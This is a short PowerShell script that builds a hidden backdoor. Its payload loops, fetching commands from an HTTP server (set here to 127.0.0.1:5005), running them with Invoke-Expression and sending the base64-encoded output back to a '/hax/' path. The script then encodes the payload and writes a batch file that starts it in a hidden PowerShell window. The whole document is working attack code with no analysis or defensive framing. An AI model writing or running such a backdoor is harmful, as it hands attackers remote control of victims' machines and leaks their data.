$plaintext = '$i="127.0.0.1:5005";while ($True){$a=Invoke-WebRequest -Method get "http://$i/cli";Write-Host $a;If($a.Content  -ne ""){$b=Invoke-Expression $a | Out-String;$c=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b));$e="http://$i/hax/";$d=$e+$c;Invoke-WebRequest -Method get $d}Else{Invoke-WebRequest -Method get http://$i/}sleep 2}'
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($plaintext))
"powershell.exe -windowstyle hidden -enc "+ $encoded | Out-File -Encoding ascii E:/a.bat
